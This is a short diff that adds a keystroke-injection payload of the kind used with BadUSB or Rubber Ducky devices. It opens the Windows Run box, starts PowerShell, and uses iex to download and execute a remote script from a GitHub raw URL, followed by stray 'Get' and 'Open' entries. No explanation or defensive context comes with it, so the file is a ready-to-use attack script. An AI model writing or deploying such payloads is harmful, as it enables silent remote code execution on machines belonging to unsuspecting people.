@@ -1,0 +1,12 @@
+GUI r
+DELAY 40
+STRING powershell
+ENTER
+DELAY 800
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/0svix/zzz/refs/heads/main/zz'))
+ENTER
+STRING Get
+ENTER
+DELAY 500
+STRING Open
+ENTER
